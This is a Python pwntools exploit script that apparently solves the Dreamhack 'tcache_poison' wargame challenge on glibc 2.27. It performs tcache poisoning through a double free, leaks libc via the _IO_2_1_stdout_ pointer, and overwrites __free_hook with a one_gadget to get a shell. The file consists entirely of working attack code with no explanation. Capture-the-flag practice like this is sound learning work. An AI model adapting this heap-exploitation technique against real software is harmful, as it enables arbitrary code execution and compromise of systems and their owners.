from pwn import *

e = ELF('./tcache_poison')
l = ELF('./libc-2.27.so')
r = remote('host3.dreamhack.games',23346)

sla = r.sendlineafter
sa = r.sendafter
sl = r.sendline

def Create(size, data):
    sla(b'Edit\n',b'1')
    sla(b'Size: ', f'{size}'.encode())
    sa(b'Content: ', data)

def Delete():
    sla(b'Edit\n',b'2')

def Edit(data):
    sla(b'Edit\n',b'4')
    sa(b'Edit chunk: ',data)

def leak():
    sla(b'Edit\n',b'3')

put_got = e.got['puts']

#Delete()
Create(0x20,b'A'*8)
Delete()

Edit(p64(0x601010)+b'\x00'*8)
Delete()

Create(0x20, p64(0x601010))
Create(0x20, b'A'*8)
Create(0x20, b'\x60')

leak()

stdout_offset = l.symbols['_IO_2_1_stdout_']

r.recvuntil(b'Content: ')
#leak = r.recvline()
leak = u64(r.recv(6)+b'\x00'*2)
libc_base = leak - stdout_offset
oneshot = libc_base + 0x4f432
free_hook = libc_base + 0x3ed8e8

print(hex(libc_base))
#----------------------------------------------
Create(0x40,b'A'*8)
Delete()

Edit(p64(free_hook)+b'\x00'*8)
Delete()

Create(0x40, p64(free_hook))
Create(0x40, b'A'*8)
Create(0x40, p64(oneshot))

Delete()

r.interactive()
